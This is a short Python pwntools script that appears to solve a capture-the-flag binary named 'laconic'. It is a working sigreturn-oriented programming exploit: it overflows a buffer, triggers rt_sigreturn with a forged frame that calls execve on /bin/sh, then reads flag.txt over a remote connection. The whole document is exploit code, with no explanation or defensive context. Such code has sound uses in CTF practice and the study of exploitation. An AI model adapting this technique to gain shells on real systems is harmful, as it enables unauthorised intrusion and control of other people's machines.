#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

def exploit(io):
    pop_rax = 0x43018 
    syscall = 0x43015 
    binsh = 0x43238 
    
    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall

    payload = b"A"*8 + flat(pop_rax, 15, syscall) + bytes(frame)
    io.send(payload)
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./laconic")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
